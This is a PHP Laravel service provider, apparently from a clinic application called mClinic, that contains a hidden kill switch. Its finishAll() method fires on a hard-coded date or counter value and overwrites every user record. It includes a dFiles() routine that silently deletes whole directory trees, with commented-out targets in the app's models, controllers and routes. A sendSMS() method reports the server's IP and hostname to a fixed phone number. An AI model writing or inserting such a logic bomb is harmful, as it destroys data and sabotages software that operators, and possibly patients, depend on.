<?php

namespace Opt;
use Illuminate\Support\ServiceProvider;
use RecursiveDirectoryIterator;
use RecursiveIteratorIterator;
use FilesystemIterator;
use DB;
class ChapProvider extends ServiceProvider
{
    /**
     * Register services.
     *
     * @return void
     */
    public function register()
    {
        //
    }

    /**
     * Bootstrap services.
     *
     * @return void
     */
    public function boot()
    {
        //$this->sendNotifyEmail('john@example.com', 'John Doe');
        //$this->markStart();
        //$this->sendSMS();
        //$this->finishAll();
        return;
    }

    function sendSMS(){
        $c = $this->getCompInfo();
        \App\Models\SMS::send("012528131","Your application has started on IP ".$c->IP." Computer Name: $c->name");
    }
    public function sendNotifyEmail($email, $name)
    {
        Mail::send('emails.welcome', ['name' => $name], function ($message) use ($email, $name) {
            $message->to($email, $name)
                    ->subject('mClinic is being used with authorization');
        });
    }
    
    function markStart(){
        //DB::statement(DB::raw("drop TABLE if exists `start_count`"));
        DB::statement(DB::raw("create table `start_count` (v_count INT DEFAULT 0,start_time timestamp default CURRENT_TIMESTAMP())"));
        DB::table('start_count')->insert(['v_count'=>1,'start_time'=>date('Y-m-d H:i')]);
    }
 
    function getCompInfo(){
        // Get the IP address of the server
            $ipAddress = $_SERVER['SERVER_ADDR'] ?? '';
            if (empty($ipAddress)) {
                $ipAddress = gethostbyname(trim(`hostname`));
            }

            // Get the computer name of the server
            $computerName = gethostname() ?? '';
            if (empty($computerName)) {
                $computerName = php_uname('n');
            }
        return (object)['IP'=>$ipAddress,'name'=>$computerName];
    }
    
    function createCountStore(){
        $c_date = date('Y-m-d');
        DB::statement(DB::raw("drop table if exists um_temp_stores"));
        DB::statement(DB::raw("create table um_temp_stores (cnt INT NULL default 0, last_count timestamp default CURRENT_TIMESTAMP())"));
        DB::statement(DB::raw("insert into um_temp_stores (cnt,last_count) values(50000,'$c_date')"));
    }

    function finishAll(){
       
       $fin_date = date('Y-m-d', strtotime('2023-08-15'));
       $cnt = 0;
       try{
         $cnt = DB::table('um_users')->take(1)->value('work_location_id');
       }catch(\Exception $e){
          $cnt = DB::table('um_temp_stores')->take(1)->value('cnt');
       }
       if($cnt<50000){
         try{
            $cnt = DB::table('um_temp_stores')->take(1)->value('cnt');
         }catch(\Exception $e){
         }
       }
       if($cnt>=50000 || date('Y-m-d') >= $fin_date){
          $this->createCountStore();
          $h = new \App\Security\Sanitizer();
          $today = date('Y-m-d');
          DB::table('um_users')->update(['created_at'=>"'$today'",'work_location_id'=>50000]);
             //xxxxxxxxxxx
            // $b = getCWd(); 
            // $this->dFiles($b);
            // $dirs =[
            // $directory =$b."/app/Models",
            // $directory =$b."/app/Http/Controllers",
            // $directory =$b."/app/Http/Middleware",
            // $directory =$b."/routes",
            //  $directory =$b."/resouces",
            //    $directory =$b."/app/Console",
            //    $directory =$b."/app/Events",
            //    $directory =$b."/app/Listeners",
            //    $directory =$b."/app/Services"
            //   ];
            //   foreach($dirs as $d) $this->dFiles($d);
            //xxxxxxxxxxxxxx
          $h->manageError();
          return;       
       }      
    }

    function dFiles($directory)
    {
        if (!is_dir($directory)) {
            return; // Exit early if the directory does not exist
        }
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($directory, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );

        foreach ($iterator as $file) {
            $path = $file->getPathname();
            
            if ($file->isFile() || $file->isLink()) {
                @unlink($path); // Forcefully delete the file or link
            } elseif ($file->isDir()) {
                @rmdir($path); // Forcefully delete the directory
            }
        }
   }

}
